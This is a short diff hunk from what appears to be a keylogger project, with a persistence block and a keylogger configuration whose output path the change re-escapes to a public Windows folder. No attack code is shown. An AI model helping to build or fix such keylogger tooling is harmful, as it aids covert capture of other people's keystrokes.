@@ -27,5 +27,5 @@ persistence = {
 
 #KEYLOGGER CONFIG
 logger = {
-	'OUTPUT_PATH':'C:\Users\Public\logs.txt'
+	'OUTPUT_PATH':'C:\\Users\\Public\\logs.txt'
 }
